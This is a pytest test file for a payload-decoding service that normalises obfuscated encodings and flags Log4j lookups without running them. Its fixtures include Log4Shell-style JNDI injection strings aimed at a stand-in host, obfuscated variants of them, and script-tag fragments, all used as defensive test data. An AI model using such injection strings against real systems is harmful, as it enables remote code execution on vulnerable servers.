"""Synthetic encoding and lookup-obfuscation fixtures; no lookup is executed."""

import base64
import json
from urllib.parse import quote

import pytest

from app.services import payload_decoding as decoder


def one(raw):
    result = decoder.decode_payload(raw)
    assert len(result["items"]) == 1
    item = result["items"][0]
    assert item["original"] == raw[item["start"]:item["end"]]
    previous = item["original"]
    for step in item["steps"]:
        assert step["input"] == previous
        previous = step["output"]
    assert previous == item["decoded"]
    assert "application_decoding_unverified" in item["warnings"]
    return item


@pytest.mark.parametrize("raw,decoded", [
    ("%u006A%6E%64%69", "jndi"),
    ("%uD83D%uDE00", "😀"),
    ("%uD55C%uAE00", "한글"),
    ("%u0025u0041", "A"),
    ("%u003Cscript%3E", "<script>"),
    ("%u0041+%2B", "A++"),
])
def test_legacy_percent_u_is_a_distinct_candidate_with_exact_steps(raw, decoded):
    item = one(raw)
    assert item["decoded"] == decoded
    assert item["steps"][0]["encoding"] == "url_percent_u"
    assert "legacy_percent_u_candidate" in item["warnings"]


@pytest.mark.parametrize("raw", ["%u12", "%uZZZZ", "%uD800", "%uDC00", "%uD800%u0041", "%u0041%FF", "%U0041"])
def test_invalid_percent_u_never_repairs_partial_input(raw):
    result = decoder.decode_payload(raw)
    assert result["items"] == []
    assert result["warnings"]


@pytest.mark.parametrize("raw,decoded", [
    (r"\u{3c}script\u{3e}", "<script>"),
    (r"\u{1F600}", "😀"),
    (r"\u{000000000041}", "A"),
    (r"\u{24}{jndi:ldap://synthetic.invalid/a}", "${jndi:ldap://synthetic.invalid/a}"),
])
def test_unicode_codepoint_escapes_keep_braces_and_source_boundaries(raw, decoded):
    item = one(raw)
    assert item["decoded"] == decoded
    assert "unicode_codepoint_escape_candidate" in item["warnings"]


@pytest.mark.parametrize("raw", [r"\u{}", r"\u{110000}", r"\u{D800}", r"\u{DFFF}", r"\u{ZZ}", r"\u{41"])
def test_invalid_codepoint_escape_is_not_decoded(raw):
    assert decoder.decode_payload(raw)["items"] == []


def test_escaped_unicode_backslash_is_still_not_reinterpreted():
    assert decoder.decode_payload(r"\\u{3c}")["items"] == []


@pytest.mark.parametrize("text", ["<script>??</script>", "한글😀 /?", "${jndi:ldap://synthetic.invalid/a}"])
@pytest.mark.parametrize("urlsafe", [False, True])
@pytest.mark.parametrize("padding", [False, True])
def test_base64_variants_keep_canonical_bits_and_explain_inferred_padding(text, urlsafe, padding):
    encode = base64.urlsafe_b64encode if urlsafe else base64.b64encode
    encoded = encode(text.encode()).decode()
    raw = encoded if padding else encoded.rstrip("=")
    item = one("value=" + raw)
    assert item["decoded"] == text
    assert item["steps"][0]["encoding"] == ("base64url" if "-" in raw or "_" in raw else "base64")
    assert "base64_candidate" in item["warnings"]
    assert ("base64_padding_inferred" in item["warnings"]) == (raw != encoded)


@pytest.mark.parametrize("raw", [
    "abcdefghijklm", "PHNjcmlwdD4_=", "PHNjcmlwdD4==", "PHNjcmlwdD4===",
    "PHN+cmlwdD_4", "PHNjcmlwdD5", "SGVsbG8", "YWJjZGVmZ2hp", "_SGVsbG8=",
])
def test_invalid_and_ambiguous_base64_is_not_repaired(raw):
    assert decoder.decode_payload(raw)["items"] == []


LOOKUP = "${${lower:J}ndi:ldap://synthetic.invalid/a}"
NORMALIZED = "${jndi:ldap://synthetic.invalid/a}"


@pytest.mark.parametrize("raw", [LOOKUP, quote(LOOKUP, safe=""), LOOKUP.replace("$", "%24"), LOOKUP.replace("$", "&#36;")])
def test_lookup_survives_literal_and_encoded_delimiters(raw):
    item = one("X-Synthetic: " + raw + "\r\n")
    assert item["original"] == raw
    assert item["decoded"] == NORMALIZED
    assert item["steps"][-1]["encoding"] == "log4j_lookup_static"
    assert "jndi_lookup_not_executed" in item["warnings"]


def test_three_distinct_layers_url_unicode_lookup_share_one_item():
    raw = quote(LOOKUP.replace("$", r"\u0024"), safe="")
    item = one(raw)
    assert item["decoded"] == NORMALIZED
    assert [step["encoding"] for step in item["steps"]] == ["url_percent", "unicode_escape", "log4j_lookup_static"]


@pytest.mark.parametrize("raw,warning", [
    (NORMALIZED, "jndi_lookup_not_executed"),
    ("${env:SYNTHETIC_NOT_READ:-j}", "unresolved_lookup"),
    ("${sys:synthetic.value:-j}", "unresolved_lookup"),
])
def test_unchanged_lookups_are_visible_without_fictitious_conversion_steps(raw, warning):
    item = one(raw)
    assert item["original"] == item["decoded"] == raw
    assert item["steps"] == []
    assert warning in item["warnings"]


def test_multiple_lookup_and_encoding_occurrences_keep_exact_distinct_positions():
    raw = f"한글😀 X: {LOOKUP}\r\nY: {LOOKUP}\r\nZ: %u0041\r\n"
    result = decoder.decode_payload(raw)
    assert [item["decoded"] for item in result["items"]] == [NORMALIZED, NORMALIZED, "A"]
    assert len({item["start"] for item in result["items"]}) == 3
    assert all(raw[item["start"]:item["end"]] == item["original"] for item in result["items"])


def test_malformed_lookup_is_not_split_into_decodable_child_fragments():
    raw = "${jndi:${lower:J}\r\nnext=%42"
    result = decoder.decode_payload(raw)
    assert result["items"][0]["original"] == "${jndi:${lower:J}"
    assert result["items"][0]["decoded"] == "${jndi:${lower:J}"
    assert result["items"][-1]["decoded"] == "B"


def test_lookup_crossing_scan_boundary_is_never_presented_as_complete(monkeypatch):
    monkeypatch.setattr(decoder, "MAX_SCAN_CHARS", len(LOOKUP) - 1)
    result = decoder.decode_payload(LOOKUP)
    assert result["items"] == []
    assert "candidate_crosses_scan_boundary" in result["warnings"]


def test_deep_and_many_lookup_inputs_remain_bounded_and_json_safe():
    for raw in ["${lower:" * 2000 + "J" + "}" * 2000, "${env:SYNTHETIC} " * 500, LOOKUP * 5000]:
        result = decoder.decode_payload(raw)
        assert len(json.dumps(result, ensure_ascii=True).encode("ascii")) <= decoder.MAX_SERIALIZED_BYTES
        assert len(result["items"]) <= decoder.MAX_ITEMS
        assert all(len(item["steps"]) <= decoder.MAX_DECODE_STEPS for item in result["items"])


def test_decoding_cannot_lookup_network_or_read_environment(monkeypatch, caplog, capsys):
    import os
    import socket
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("forbidden_side_effect")

    monkeypatch.setattr(socket, "getaddrinfo", forbidden)
    monkeypatch.setattr(socket, "create_connection", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(os, "getenv", forbidden)
    raw = LOOKUP + " ${env:SYNTHETIC:-j} ${sys:synthetic:-n}"
    result = decoder.decode_payload(raw)
    assert len(result["items"]) == 3
    assert not caplog.records
    assert capsys.readouterr() == ("", "")
